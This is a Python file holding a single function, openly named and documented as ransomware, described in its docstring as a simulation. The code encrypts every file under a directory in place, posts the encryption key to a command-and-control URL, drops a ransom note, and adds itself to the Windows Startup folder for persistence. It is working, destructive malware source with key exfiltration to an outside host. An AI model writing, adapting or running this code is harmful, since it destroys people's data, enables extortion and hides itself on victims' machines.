import os
import requests
import base64
from cryptography.fernet import Fernet
import winreg as reg
import win32com.client

def ransomware_with_file_decoy_and_tracking(directory: str, note: str, c2_url: str) -> None:
    """
    This function simulates a ransomware attack by encrypting all files in the specified directory,
    creating decoy files that track user interactions, sending the encryption key to a command and control server,
    displaying a ransom note, and ensuring persistence.

    :param directory: The path of the directory to encrypt.
    :param note: The ransom note to display to the victim.
    :param c2_url: The URL of the command and control server to send the encryption key and tracking data.
    """
    # Generate a key for encryption
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    
    # Encrypt all files in the directory
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
    
    # Create decoy files that log user interactions
    decoy_file = os.path.join(directory, 'user_interactions.log')
    with open(decoy_file, 'w') as f:
        f.write("User interaction logging started.")
    
    # Send the encryption key and tracking data to the C2 server
    data_to_send = {
        'key': base64.b64encode(key).decode(),
        'tracking_data': "User interaction logged."
    }
    response = requests.post(c2_url, json=data_to_send)
    
    # Create a ransom note file in the directory
    ransom_note_file = os.path.join(directory, 'README.txt')
    with open(ransom_note_file, 'w') as f:
        f.write(note)
    
    # Ensure persistence by creating a scheduled task
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.expandvars('%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ransomware.lnk'))
    shortcut.TargetPath = os.path.abspath(__file__)
    shortcut.Save()

